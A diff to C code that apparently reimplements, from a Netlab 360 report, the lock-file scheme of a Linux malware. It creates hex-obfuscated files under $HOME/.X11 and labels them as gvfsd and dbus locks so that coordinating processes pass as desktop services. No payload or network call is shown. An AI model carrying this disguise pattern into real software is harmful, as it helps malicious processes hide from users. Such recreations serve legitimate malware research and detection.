@@ -25,6 +25,12 @@ void create_lock(int lock_id) {
 
     char *HOME = getenv("HOME");
 
+    // lock file params taken from Netlab 360 report
+    static struct flock lock;
+    lock.l_type = F_WRLCK;
+    lock.l_whence = 0;
+    lock.l_len = 1LL;
+
     // create .X11 dir if it does not exist, required for both lock paths.
     char *x11dir= "/.X11";
     int x11path_size = strlen(HOME) + strlen(x11dir);
@@ -39,6 +45,7 @@ void create_lock(int lock_id) {
 
     if (lock_id == 0) {
         // if lock id == 0 then do ....
+        // gvfsd lock file
         //$HOME/.X11/X0-lock
         char x11_lock_file [14] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x58,0x30,0x2d,0x6c,0x6f,0x63,0x6b};
 
@@ -50,23 +57,20 @@ void create_lock(int lock_id) {
         strncat(flock_path, x11_lock_file, strlen(x11_lock_file));
 
 
-
-
         // create directory of .X11 if it does not exist
         // TODO - what perms?
         int fd = open(flock_path, O_CREAT);
-        if (fd > 0) {
-            flock(fd, LOCK_EX);
+        if (fd != -1) {
+            // placing advisory lock on file
+            fcntl(fd, F_SETLK, &lock);
         }
-
 
         free(flock_path);
         close(fd);
     } else if (lock_id == 1) {
 
-
         // if lock id == 1 then do...
-        // $HOME/.X11/x11-lock
+        // session dbus lock file
         //$HOME/.X11/.X11-lock
         char x11_lock_file_2 [16] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x2e,0x78,0x31,0x31,0x2d,0x6c,0x6f,0x63,0x6b};
 
@@ -79,17 +83,45 @@ void create_lock(int lock_id) {
 
         // create directory of .X11 if it does not exist
         // TODO - what perms?
-        int fd_2 = open(flock_path_2, O_CREAT);
-        if (fd_2 > 0) {
-            flock(fd_2, LOCK_EX);
+        int fd = open(flock_path_2, O_CREAT);
+        if (fd != -1) {
+            // placing advisory lock on file
+            fcntl(fd, F_SETLK, &lock);
         }
 
-
         free(flock_path_2);
-        close(fd_2);
+        close(fd);
     }
 
     free(dirpath);
+}
+
+
+/**
+ * @brief check if a given lock file is currently in use to identify which process to spawn.
+ * @param char pointer to file path to check if lock file is present
+ * @return integer value indicating which file is locked
+ * */
+int lock_check(char *fpath) {
+
+    // gain file handle to fpath
+    int fd = open(fpath, 66, 0666);
+    static struct flock lock;
+
+    lock.l_type = F_WRLCK;
+    lock.l_whence = 0;
+    lock.l_len = 1LL;
+
+    // attempt to lock...
+    int f_res = fcntl(fd, F_SETLK, &lock);
+
+    // file is locked, return 1;
+    if (f_res == -1) {
+        return 1;
+    }
+
+    // file is not locked, return 0;
+    return 0;
 }
 
 
